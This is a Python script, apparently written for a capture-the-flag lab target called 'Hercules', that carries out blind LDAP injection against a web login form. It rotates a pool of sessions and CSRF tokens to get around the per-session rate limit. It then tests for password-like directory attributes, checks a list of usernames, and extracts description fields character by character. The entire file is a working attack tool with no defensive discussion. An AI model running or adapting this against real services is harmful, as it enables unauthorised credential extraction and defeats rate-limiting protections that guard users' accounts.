#!/usr/bin/env python3
"""
Hercules LDAP injection extractor using a session pool.

The /Login rate limit is PER SESSION (~10 requests, then 429 for ~30 s), not
per IP. Rotating many cookie jars multiplies throughput enormously.

Usage:
  python3 pool_extract.py attrs
  python3 pool_extract.py desc [prefix]
  python3 pool_extract.py users
"""
import re
import sys
import threading
import time
import urllib.parse

import requests
import urllib3

urllib3.disable_warnings()

LOGIN = "https://10.129.242.196/Login"
BUDGET = 10
REST = 32.0
POOL_SIZE = 16
REQ = [0]
LOCK = threading.Lock()


def dbl(s):
    return urllib.parse.quote(urllib.parse.quote(s, safe=""), safe="")


class Session:
    def __init__(self):
        self.new()

    def new(self):
        self.s = requests.Session()
        self.s.verify = False
        r = self.s.get(LOGIN, timeout=15)
        self.tok = re.search(r'name="__RequestVerificationToken"[^>]*value="([^"]+)"', r.text).group(1)
        self.used = 0
        self.rest_until = 0.0

    def available(self):
        return time.time() >= self.rest_until and self.used < BUDGET

    def post(self, username_encoded, password="x"):
        if not self.available():
            return None
        body = (f"Username={username_encoded}&Password={password}&RememberMe=false"
                f"&__RequestVerificationToken={self.tok}")
        try:
            r = self.s.post(LOGIN, data=body.encode(),
                            headers={"Content-Type": "application/x-www-form-urlencoded"},
                            timeout=25)
        except Exception:
            self.used = BUDGET
            self.rest_until = time.time() + 5
            return None
        self.used += 1
        REQ[0] += 1
        if r.status_code == 429:
            self.used = BUDGET
            self.rest_until = time.time() + REST
            return None
        if self.used >= BUDGET:
            self.rest_until = time.time() + REST
        return r.text


POOL = []


def init_pool():
    for _ in range(POOL_SIZE):
        POOL.append(Session())


def oracle(inj):
    """True if the injected condition matches >=1 entry."""
    enc = dbl(inj)
    while True:
        with LOCK:
            cands = [p for p in POOL if p.available()]
        if cands:
            s = cands[0]
            out = s.post(enc)
            if out is None:
                continue
            if len(out) == 3213:      # LDAP syntax error / form re-render
                return False
            return "Login attempt failed" in out
        # everything resting: create a replacement for the oldest
        time.sleep(0.3)
        with LOCK:
            if all(not p.available() for p in POOL):
                resting = [p for p in POOL if p.rest_until > time.time()]
                if resting and time.time() - min(p.rest_until for p in resting) > -25:
                    pass
                new = Session()
                POOL.append(new)
                if len(POOL) > POOL_SIZE * 4:
                    POOL.pop(0)


CHARSET = ("abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
           "_-!@#$%^&+=.,?/|~ *)('\\\"")

# characters that must be hex-escaped inside an LDAP filter value
LDAP_SPECIAL = set("*()\\\x00")


def esc(v: str) -> str:
    """LDAP-escape special characters so they are matched literally."""
    return "".join(("\\%02x" % ord(ch)) if ch in LDAP_SPECIAL else ch for ch in v)


def extract(attr, prefix="", maxlen=45, extra=""):
    val = prefix
    t0 = time.time()
    while len(val) < maxlen:
        hit = None
        for c in CHARSET:
            if oracle(f"*)({attr}={esc(val + c)}*{extra}"):
                hit = c
                break
        if hit is None:
            break
        val += hit
        print(f"    {val!r}  [req {REQ[0]}, {time.time()-t0:.0f}s]", flush=True)
    print(f"  final: {val!r}  ({REQ[0]} requests, {time.time()-t0:.0f}s)", flush=True)
    return val


if __name__ == "__main__":
    init_pool()
    print(f"pool of {POOL_SIZE} sessions ready", flush=True)
    mode = sys.argv[1]
    if mode == "attrs":
        for a in ["description", "password", "password2", "pass", "pwd", "info",
                  "userPassword", "secret", "tempPassword", "ssoPassword",
                  "sAMAccountName", "comment", "notes", "employeeType", "title"]:
            r = oracle(f"*)({a}=*")
            print(f"{a:18s} {'EXISTS' if r else '-'}", flush=True)
    elif mode == "desc":
        pre = sys.argv[2] if len(sys.argv) > 2 else ""
        extract("description", pre)
    elif mode == "users":
        # find users that have a description
        for u in ["auditor", "will.s", "mark.s", "ashley.b", "heather.s", "stephen.m",
                  "patrick.s", "jennifer.a", "zeke.s", "tish.c", "admin", "administrator",
                  "bob.w", "svc_sso", "backup", "sql", "web_admin", "jupiter", "atlas"]:
            r1 = oracle(f"{u})(description=*")
            print(f"{u:16s} desc={'YES' if r1 else 'no'}", flush=True)
